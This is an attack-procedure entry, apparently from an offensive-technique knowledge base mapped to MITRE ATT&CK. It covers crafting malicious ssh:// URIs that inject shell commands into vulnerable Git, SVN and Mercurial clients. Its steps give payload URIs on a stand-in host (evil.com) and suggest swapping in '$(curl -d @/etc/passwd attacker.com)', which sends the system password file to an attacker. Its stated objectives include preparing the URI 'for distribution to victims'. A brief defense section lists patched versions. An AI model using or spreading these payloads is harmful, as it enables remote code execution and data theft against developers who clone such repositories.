---
tags:
  - command-injection
  - ssh
  - uri
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/echo-test-command]]'
platforms:
  - Linux
  - Unix-like
techniques:
  - '[[Unix Shell]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 633f5954-75a5-468a-99bc-45b0aa409b6d
created_at: '2025-12-14T17:23:42.384Z'
updated_at: '2025-12-14T17:23:42.384Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Craft-Malicious-ssh-URI-for-Command-Injection

## Summary

This procedure outlines crafting ssh:// URIs with embedded OS command injection payloads, exploiting parsing flaws in VCS clients to enable RCE during repository operations.

## Description

In vulnerable VCS like Git, SVN, and Mercurial, ssh:// URIs are passed to the SSH client without proper sanitization, allowing injection via shell metacharacters such as $(command) or ; command. The attacker designs a URI like ssh://user@host/$(malicious_cmd) that, when processed (e.g., during clone), executes the command on the victim's local system. This targets Unix-like environments where SSH is the transport. Prerequisites include knowledge of the target's VCS version and shell environment. Expected outcomes: arbitrary command execution, leading to info disclosure or compromise.

## Requirements

1. Access to craft and host a domain (e.g., evil.com) for URI resolution
2. Knowledge of victim's VCS tool and vulnerable version (pre-patched)
3. Basic shell scripting for payload testing

## Defense

Defensive measures and detection strategies:

- Patch VCS tools to fixed versions (Git >=2.14.1, SVN >=1.9.7, Mercurial >=4.1.2)
- Use strict URI whitelisting and disable SSH transport where possible
- Monitor for anomalous SSH invocations or command outputs in VCS logs

## Objectives

1. Create a functional injection payload within ssh:// URI constraints
2. Test payload for cross-VCS compatibility
3. Prepare URI for distribution to victims

## Instructions

### Step 1: Design Payload

**Context**: Select a command injection technique using subshell $( ) for Unix shells, ensuring it executes post-URI parsing.

**Command** ([[commands/echo-test-command]]):
```bash
echo 'ssh://git@evil.com/$(whoami)'
```

> This echoes the URI structure; replace whoami with actual payload like $(curl -d @/etc/passwd attacker.com). Expected output: ssh://git@evil.com/$(whoami).

### Step 2: Validate Payload

**Context**: Test the payload in a controlled SSH call to confirm injection without full VCS simulation.

**Command** ([[commands/echo-test-command]]):
```bash
ssh git@evil.com '$(whoami)'
```

> Simulates SSH arg injection; look for command output in response. Success if whoami executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques

- None

## Commands Used

- [[commands/echo-test-command]]

## Tools Used

- None

## Tags

- [[command-injection]]
- [[SSH]]
- [[rce]]
